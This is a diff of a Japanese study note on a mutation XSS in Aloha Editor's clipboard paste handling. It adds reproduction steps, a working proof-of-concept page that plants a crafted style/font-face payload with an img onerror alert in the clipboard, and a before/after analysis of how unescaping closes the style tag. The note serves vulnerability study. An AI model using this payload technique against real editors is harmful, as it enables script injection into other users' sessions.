@@ -40,6 +40,48 @@ textEditor.innerHTML = clipboardData.innerHTML;
 
 （つまり、 <\/style> が </style> に変換されるため、これを clipboardData.innerHTML 経由で書き込むことで <style>の終了と後続 処理をインジェクションできるということ？）
 
-PoC --------------
+## PoC
+1. Go to https://jsbin.com/xivapasere/1/edit?html,output
+2. Press copy me.
+3. Go to https://rawgit.com/alohaeditor/Aloha-Editor/hotfix/src/demo/boilerplate/ (Mutation XSS に対して脆弱なテキストエリアがある).
+4. Give Aloha Editor a while to load...
+5. Go to any contenteditable content.
+6. Paste from clipboard.
+7. Alert fires!
 
-TODO
+PoC
+```html
+<button onclick=document.execCommand('copy')>
+  me</button>!
+Everything will be fine!
+<br><span style=color:red id=out></span>
+<script>
+  document.oncopy = ev => {
+    ev.preventDefault();
+    const exploit = String.raw`<style>
+@font-face { font-family: "ab<\/style><img src onerror=alert(1)>"; }
+</style>`;
+    ev.clipboardData.setData('text/html', exploit);
+    out.innerText = 'Good! Now paste it!';
+  }
+</script>
+```
+
+重要そうなところは以下
+
+before
+```html
+<style>
+@font-face { font-family: "ab<\/style><img src onerror=alert(1)>"; }
+</style>
+```
+
+after
+```html
+<style>
+@font-face { font-family: \"ab</style><img src onerror=alert(1)>\"; }
+</style>
+```
+
+`"` が `\"` に変わり、後続の `<\/style>` が `</style>` に変わっている。
+これによって style タグが閉じ、後続の <img> がInjectされる。
